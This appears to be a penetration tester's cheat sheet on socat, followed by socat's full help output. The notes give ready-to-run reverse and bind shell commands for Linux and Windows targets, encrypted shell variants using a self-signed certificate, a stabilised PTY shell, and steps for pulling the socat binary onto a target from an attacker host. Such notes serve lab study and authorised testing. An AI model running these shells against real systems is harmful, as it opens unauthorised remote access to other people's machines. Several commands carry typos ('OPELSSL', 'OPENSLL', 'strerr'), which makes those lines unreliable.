
get binary https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

from simpler nc shell:
- upload socat binary to target machine (`python3 -m http.server 8000`)
- `wget 10.18.21.236/tools/socat` or `curl -O http://10.18.21.236/tools/socat` to dl to current dir

socat is used to connect two points together - for example your keyboard/screen and a remote ip+port

mostly useful on linux

---
## Shells

#### Reverse shell - Listener on our machine

listen on our machine: (can be used like `nc -lvnp <port>`, not just for socat connections)
`socat TCP-L:<port> -`

connect with windows target:
`socat TCP:<ip>:<port> EXEC:powershell.exe,pipes`
`pipes` forces use of unix style io

connect with linux target:
`socat TCP:<ip>:<port> EXEC:"bash -li"`

#### Bind shell - listener on target

listen on linux target:
`socat TCP-L:<port> EXEC:"bash -li"`

listen on windows target:
`socat TCP-L:<port> EXEC:powershell,pipes`
`pipes` forces use of unix style io

connect with our machine:
`socat TCP:<ip>:<port> -`

`-` means stdio, standard input output


### Debugging

You can add `-d -d` to a socat command to increase verbosity


## Encrypted shells

#### Create certificate

generate a certificate:
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
`req` request a certificate
`--newkey rsa:2048` generate a 2048 bit RSA key
`-nodes` save private key as plain text
`-keyout shell.key` key filename
`-x509` generate a self-signed cert
`-days 362` set cert validity
`-out shell.crt` cert filename

merge the key and the cert:
`cat shell.key shell.crt > shell.pem`

#### Reverse shell - Listener on our machine

listen on our machine:
`socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`
`verify=0` don't validate that cert has been signed by recognized authority

connect with linux target:
`socat OPELSSL:<ip>:<port>,verify=0 EXEC:/bin/bash`

#### Bind shell - listener on target

listen on windows target:
`socat OPENSLL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
`verify=0` don't validate cert has been signed by recognized authority
`pipes` forces use of unix style io

connect with our machine:
`socat OPENSLL:<ip>:<port>,verify=0 -`


## More advanced listener for linux

Requires socat on both machines

listen on our machine:
`socat TCP-L:<port> FILE:'tty',raw,echo=0`
is much more stable and sets echo off

connect with linux target:
`socat TCP:<ip>:<port> EXEC:"bash -li",pty,strerr,sigint,setsid,sane`

#### With encryption

listen on our machine:
`socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 FILE:'tty',raw,echo=0`

connect with linux target:
`socat OPENSSL:<ip>:<port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`



### Help

```sh
┌──(kali㉿kali)-[~]
└─$ socat -h    
socat by Gerhard Rieger and contributors - see www.dest-unreach.org
Usage:
socat [options] <bi-address> <bi-address>
   options (general command line options):
      -V     print version and feature information to stdout, and exit
      -h|-?  print a help text describing command line options and addresses
      -hh    like -h, plus a list of all common address option names
      -hhh   like -hh, plus a list of all available address option names
      -d[ddd]        increase verbosity (use up to 4 times; 2 are recommended)
      -d0|1|2|3|4    set verbosity level (0: Errors; 4 all including Debug)
      -D     analyze file descriptors before loop
      --experimental enable experimental features
      --statistics   output transfer statistics on exit
      -ly[facility]  log to syslog, using facility (default is daemon)
      -lf<logfile>   log to file
      -ls            log to stderr (default if no other log)
      -lm[facility]  mixed log mode (stderr during initialization, then syslog)
      -lp<progname>  set the program name used for logging and vars
      -lu            use microseconds for logging timestamps
      -lh            add hostname to log messages
      -v     verbose text dump of data traffic
      -x     verbose hexadecimal dump of data traffic
      -r <file>      raw dump of data flowing from left to right
      -R <file>      raw dump of data flowing from right to left
      -b<size_t>     set data buffer size (8192)
      -s     sloppy (continue on error)
      -S<sigmask>    log these signals, override default
      -t<timeout>    wait seconds before closing second channel
      -T<timeout>    total inactivity timeout in seconds
      -u     unidirectional mode (left to right)
      -U     unidirectional mode (right to left)
      -g     do not check option groups
      -L <lockfile>  try to obtain lock, or fail
      -W <lockfile>  try to obtain lock, or wait
      -4     prefer IPv4 if version is not explicitly specified
      -6     prefer IPv6 if version is not explicitly specified
   bi-address:  /* is an address that may act both as data sync and source */
      <single-address>
      <single-address>!!<single-address>
   single-address:
      <address-head>[,<opts>]
   address-head:
      ABSTRACT-CLIENT:<filename>                groups=FD,SOCKET,RETRY,UNIX
      ABSTRACT-CONNECT:<filename>               groups=FD,SOCKET,RETRY,UNIX
      ABSTRACT-LISTEN:<filename>                groups=FD,SOCKET,LISTEN,CHILD,RETRY,UNIX
      ABSTRACT-RECV:<filename>                  groups=FD,SOCKET,RETRY,UNIX
      ABSTRACT-RECVFROM:<filename>              groups=FD,SOCKET,CHILD,RETRY,UNIX
      ABSTRACT-SENDTO:<filename>                groups=FD,SOCKET,RETRY,UNIX
      ACCEPT-FD:<fdnum>                         groups=FD,SOCKET,CHILD,RETRY,RANGE,UNIX,IP4,IP6,UDP,TCP
      CREATE:<filename>                         groups=FD,REG,NAMED
      DCCP-CONNECT:<host>:<port>                groups=FD,SOCKET,CHILD,RETRY,IP4,IP6
      DCCP-LISTEN:<port>                        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6
      DCCP4-CONNECT:<host>:<port>               groups=FD,SOCKET,CHILD,RETRY,IP4
      DCCP4-LISTEN:<port>                       groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4
      DCCP6-CONNECT:<host>:<port>               groups=FD,SOCKET,CHILD,RETRY,IP6
      DCCP6-LISTEN:<port>                       groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP6
      EXEC:<command-line>                       groups=FD,FIFO,SOCKET,EXEC,FORK,TERMIOS,PTY,PARENT,UNIX
      FD:<fdnum>                                groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP
      GOPEN:<filename>                          groups=FD,FIFO,CHR,BLK,REG,SOCKET,NAMED,OPEN,TERMIOS,UNIX
      INTERFACE:<interface>                     groups=FD,SOCKET,INTERFACE
      IP-DATAGRAM:<host>:<protocol>             groups=FD,SOCKET,RANGE,IP4,IP6
      IP-RECV:<protocol>                        groups=FD,SOCKET,RANGE,IP4,IP6
      IP-RECVFROM:<protocol>                    groups=FD,SOCKET,CHILD,RANGE,IP4,IP6
      IP-SENDTO:<host>:<protocol>               groups=FD,SOCKET,IP4,IP6
      IP4-DATAGRAM:<host>:<protocol>            groups=FD,SOCKET,RANGE,IP4
      IP4-RECV:<protocol>                       groups=FD,SOCKET,RANGE,IP4
      IP4-RECVFROM:<protocol>                   groups=FD,SOCKET,CHILD,RANGE,IP4
      IP4-SENDTO:<host>:<protocol>              groups=FD,SOCKET,IP4
      IP6-DATAGRAM:<host>:<protocol>            groups=FD,SOCKET,RANGE,IP6
      IP6-RECV:<protocol>                       groups=FD,SOCKET,RANGE,IP6
      IP6-RECVFROM:<protocol>                   groups=FD,SOCKET,CHILD,RANGE,IP6
      IP6-SENDTO:<host>:<protocol>              groups=FD,SOCKET,IP6
      OPEN:<filename>                           groups=FD,FIFO,CHR,BLK,REG,NAMED,OPEN,TERMIOS
      OPENSSL:<host>:<port>                     groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,OPENSSL
      OPENSSL-DTLS-CLIENT:<host>:<port>         groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,UDP,OPENSSL
      OPENSSL-DTLS-SERVER:<port>                groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,UDP,OPENSSL
      OPENSSL-LISTEN:<port>                     groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,TCP,OPENSSL
      PIPE[:<filename>]                         groups=FD,FIFO,NAMED,OPEN
      POSIXMQ-BIDIRECTIONAL:<mqname>            groups=FD,NAMED,RETRY
      POSIXMQ-READ:<mqname>                     groups=FD,NAMED,RETRY
      POSIXMQ-RECEIVE:<mqname>                  groups=FD,NAMED,CHILD,RETRY
      POSIXMQ-SEND:<mqname>                     groups=FD,NAMED,CHILD,RETRY
      PROXY:<proxy-server>:<host>:<port>        groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,HTTP
      PTY                                       groups=FD,NAMED,TERMIOS,PTY
      SCTP-CONNECT:<host>:<port>                groups=FD,SOCKET,CHILD,RETRY,IP4,IP6
      SCTP-LISTEN:<port>                        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6
      SCTP4-CONNECT:<host>:<port>               groups=FD,SOCKET,CHILD,RETRY,IP4
      SCTP4-LISTEN:<port>                       groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4
      SCTP6-CONNECT:<host>:<port>               groups=FD,SOCKET,CHILD,RETRY,IP6
      SCTP6-LISTEN:<port>                       groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP6
      SHELL:<shell-command>                     groups=FD,FIFO,SOCKET,EXEC,FORK,SHELL,TERMIOS,PTY,PARENT,UNIX
      SOCKET-CONNECT:<domain>:<protocol>:<remote-address>       groups=FD,SOCKET,CHILD,RETRY
      SOCKET-DATAGRAM:<domain>:<type>:<protocol>:<remote-address>       groups=FD,SOCKET,RANGE
      SOCKET-LISTEN:<domain>:<protocol>:<local-address> groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE
      SOCKET-RECV:<domain>:<type>:<protocol>:<local-address>    groups=FD,SOCKET,RANGE
      SOCKET-RECVFROM:<domain>:<type>:<protocol>:<local-address>        groups=FD,SOCKET,CHILD,RANGE
      SOCKET-SENDTO:<domain>:<type>:<protocol>:<remote-address> groups=FD,SOCKET
      SOCKETPAIR:<filename>                     groups=FD,SOCKET
      SOCKS4:<socks-server>:<host>:<port>       groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,SOCKS4
      SOCKS4A:<socks-server>:<host>:<port>      groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,SOCKS4
      SOCKS5-CONNECT:<socks-server>:<socks-port>:<target-host>:<target-port>    groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP
      SOCKS5-LISTEN:<socks-server>:<socks-port>:<listen-host>:<listen-port>     groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP
      STDERR                                    groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP
      STDIN                                     groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP
      STDIO                                     groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP
      STDOUT                                    groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP
      SYSTEM:<shell-command>                    groups=FD,FIFO,SOCKET,EXEC,FORK,TERMIOS,PTY,PARENT,UNIX
      TCP-CONNECT:<host>:<port>                 groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP
      TCP-LISTEN:<port>                         groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,TCP
      TCP4-CONNECT:<host>:<port>                groups=FD,SOCKET,CHILD,RETRY,IP4,TCP
      TCP4-LISTEN:<port>                        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,TCP
      TCP6-CONNECT:<host>:<port>                groups=FD,SOCKET,CHILD,RETRY,IP6,TCP
      TCP6-LISTEN:<port>                        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP6,TCP
      TUN[:<ip-addr>/<bits>]                    groups=FD,CHR,OPEN,INTERFACE
      UDP-CONNECT:<host>:<port>                 groups=FD,SOCKET,IP4,IP6,UDP
      UDP-DATAGRAM:<host>:<port>                groups=FD,SOCKET,RANGE,IP4,IP6,UDP
      UDP-LISTEN:<port>                         groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,IP6,UDP
      UDP-RECV:<port>                           groups=FD,SOCKET,RANGE,IP4,IP6,UDP
      UDP-RECVFROM:<port>                       groups=FD,SOCKET,CHILD,RANGE,IP4,IP6,UDP
      UDP-SENDTO:<host>:<port>                  groups=FD,SOCKET,IP4,IP6,UDP
      UDP4-CONNECT:<host>:<port>                groups=FD,SOCKET,IP4,UDP
      UDP4-DATAGRAM:<host>:<port>               groups=FD,SOCKET,RANGE,IP4,UDP
      UDP4-LISTEN:<port>                        groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,UDP
      UDP4-RECV:<port>                          groups=FD,SOCKET,RANGE,IP4,UDP
      UDP4-RECVFROM:<port>                      groups=FD,SOCKET,CHILD,RANGE,IP4,UDP
      UDP4-SENDTO:<host>:<port>                 groups=FD,SOCKET,IP4,UDP
      UDP6-CONNECT:<host>:<port>                groups=FD,SOCKET,IP6,UDP
      UDP6-DATAGRAM:<host>:<port>               groups=FD,SOCKET,RANGE,IP6,UDP
      UDP6-LISTEN:<port>                        groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP6,UDP
      UDP6-RECV:<port>                          groups=FD,SOCKET,RANGE,IP6,UDP
      UDP6-RECVFROM:<port>                      groups=FD,SOCKET,CHILD,RANGE,IP6,UDP
      UDP6-SENDTO:<host>:<port>                 groups=FD,SOCKET,IP6,UDP
      UDPLITE-CONNECT:<host>:<port>             groups=FD,SOCKET,IP4,IP6,UDP
      UDPLITE-DATAGRAM:<host>:<port>            groups=FD,SOCKET,RANGE,IP4,IP6,UDP
      UDPLITE-LISTEN:<port>                     groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,IP6,UDP
      UDPLITE-RECV:<port>                       groups=FD,SOCKET,RANGE,IP4,IP6,UDP
      UDPLITE-RECVFROM:<port>                   groups=FD,SOCKET,CHILD,RANGE,IP4,IP6,UDP
      UDPLITE-SENDTO:<host>:<port>              groups=FD,SOCKET,IP4,IP6,UDP
      UDPLITE4-CONNECT:<host>:<port>            groups=FD,SOCKET,IP4,UDP
      UDPLITE4-DATAGRAM:<remote-address>:<port> groups=FD,SOCKET,RANGE,IP4,UDP
      UDPLITE4-LISTEN:<port>                    groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,UDP
      UDPLITE4-RECV:<port>                      groups=FD,SOCKET,RANGE,IP4,UDP
      UDPLITE4-RECVFROM:<host>:<port>           groups=FD,SOCKET,CHILD,RANGE,IP4,UDP
      UDPLITE4-SENDTO:<host>:<port>             groups=FD,SOCKET,IP4,UDP
      UDPLITE6-CONNECT:<host>:<port>            groups=FD,SOCKET,IP6,UDP
      UDPLITE6-DATAGRAM:<host>:<port>           groups=FD,SOCKET,RANGE,IP6,UDP
      UDPLITE6-LISTEN:<port>                    groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP6,UDP
      UDPLITE6-RECV:<port>                      groups=FD,SOCKET,RANGE,IP6,UDP
      UDPLITE6-RECVFROM:<port>                  groups=FD,SOCKET,CHILD,RANGE,IP6,UDP
      UDPLITE6-SENDTO:<host>:<port>             groups=FD,SOCKET,IP6,UDP
      UNIX-CLIENT:<filename>                    groups=FD,SOCKET,NAMED,RETRY,UNIX
      UNIX-CONNECT:<filename>                   groups=FD,SOCKET,NAMED,RETRY,UNIX
      UNIX-LISTEN:<filename>                    groups=FD,SOCKET,NAMED,LISTEN,CHILD,RETRY,UNIX
      UNIX-RECV:<filename>                      groups=FD,SOCKET,NAMED,RETRY,UNIX
      UNIX-RECVFROM:<filename>                  groups=FD,SOCKET,NAMED,CHILD,RETRY,UNIX
      UNIX-SENDTO:<filename>                    groups=FD,SOCKET,NAMED,RETRY,UNIX
      VSOCK-CONNECT:<cid>:<port>                groups=FD,SOCKET,CHILD,RETRY
      VSOCK-LISTEN:<port>                       groups=FD,SOCKET,LISTEN,CHILD,RETRY
                         
```